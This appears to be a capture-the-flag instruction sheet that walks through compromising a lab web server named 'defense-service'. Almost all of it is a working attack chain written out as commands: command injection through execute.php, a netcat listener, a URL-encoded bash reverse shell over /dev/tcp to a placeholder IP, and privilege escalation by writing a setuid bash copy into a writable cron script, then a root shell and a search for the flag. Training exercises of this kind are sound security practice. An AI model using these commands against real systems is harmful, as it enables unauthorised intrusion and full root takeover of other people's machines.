LINUX DB SERVER CHALLENGE INSTRUCTIONS
======================================

This challenge involves exploiting a vulnerable web server that's accessible via the defense-service hostname.

The target is accessible at:
- Web server: http://defense-service/
- Vulnerable page: http://defense-service/execute.php

STEP 1: Test command injection 
$ curl "http://defense-service/execute.php?cmd=id"

STEP 2: Get a reverse shell
- Start a listener:
  $ nc -lvnp 4444

- Find your IP address:
  $ ip addr | grep -w inet

- In another terminal, trigger the reverse shell:
  $ curl "http://defense-service/execute.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261"
  (Replace YOUR_IP with your IP address)

STEP 3: Escalate privileges via vulnerable cron job
$ echo '#!/bin/bash' > /opt/cronjobs/just-script.sh
$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/cronjobs/just-script.sh
$ chmod +x /opt/cronjobs/just-script.sh

STEP 4: Wait 1-2 minutes, then execute
$ /tmp/rootbash -p

STEP 5: Find the flag file
$ find / -name "*.txt" -o -name "flag*" -o -name "*flag*" 2>/dev/null

You should now have a root shell. Find the flag to complete the challenge.
